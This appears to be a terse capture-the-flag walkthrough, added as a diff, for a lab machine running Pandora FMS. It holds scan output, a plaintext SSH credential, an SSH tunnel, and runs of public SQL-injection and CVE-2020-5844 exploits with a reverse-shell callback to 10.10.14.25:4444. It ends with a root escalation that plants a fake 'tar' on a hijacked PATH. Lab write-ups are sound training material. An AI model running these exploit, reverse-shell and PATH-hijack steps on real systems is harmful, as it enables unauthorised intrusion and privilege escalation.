@@ -1,0 +1,35 @@
+PORT      STATE         SERVICE
+161/udp   open          snmp
+21868/udp open|filtered unknown
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 24c295a5c30b3ff3173c68d7af2b5338 (RSA)
+|   256 b1417799469a6c5dd2982fc0329ace03 (ECDSA)
+|_  256 e736433ba9478a190158b2bc89f65108 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Play | Landing
+
+snmpwalk -v 2c -c public 10.10.11.136
+
+-u daniel -p HotelBabylon23
+ssh 10.10.11.136 -l daniel
+
+ssh -L 80:127.0.0.1:80 daniel@10.10.11.136
+
+https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/blob/master/sqlpwn.py
+python3 sqlpwn.py -t 127.0.0.1
+
+https://github.com/UNICORDev/exploit-CVE-2020-5844
+python3 50961.py -t 127.0.0.1 80 -p g662p2k24hj0vpita4si2semia -s 10.10.14.25 4444 
+
+ltrace  /usr/bin/pandora_backup
+cd /tmp
+echo '/bin/bash;' > tar
+chmod +x tar
+export PATH=/tmp:$PATH
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
+
+/usr/bin/pandora_backup
+
